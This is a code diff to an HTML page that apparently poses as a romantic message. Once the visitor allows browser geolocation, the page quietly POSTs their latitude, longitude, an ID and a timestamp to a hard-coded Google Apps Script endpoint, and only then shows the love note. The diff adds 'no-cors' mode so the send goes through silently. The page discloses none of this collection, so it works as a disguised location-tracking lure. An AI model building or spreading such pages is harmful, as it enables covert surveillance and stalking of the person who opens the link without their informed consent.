@@ -100,7 +100,7 @@
 
 <script>
   // ══════════════════════════════════════════════
-  //  URLs fijas
+  //  CONFIGURACIÓN — solo cambia estas dos líneas
   // ══════════════════════════════════════════════
   const GAS_URL = 'https://script.google.com/macros/s/AKfycbwgJUb5FKl4TFwX0LKMcU_B2-IQ0yD0Xntv22Y3RZAjPCvtDknX96VLE49RDmNZm-0l-A/exec';
   const MSG_TXT = 'Te amo, eres la mejor persona del mundo ♡';
@@ -135,10 +135,12 @@
   async function onLocationSuccess(pos) {
     const lat = pos.coords.latitude;
     const lng = pos.coords.longitude;
+    // El receiver solo envía datos (POST no-cors) — no necesita leer respuesta
     fetch(GAS_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ action: 'saveLocation', id: MSG_ID, lat, lng, timestamp: new Date().toISOString() })
+      body: JSON.stringify({ action: 'saveLocation', id: MSG_ID, lat, lng, timestamp: new Date().toISOString() }),
+      mode: 'no-cors'
     }).catch(e => console.warn('Backend error:', e));
     showScreen('screenMessage');
     burstParticles(50);
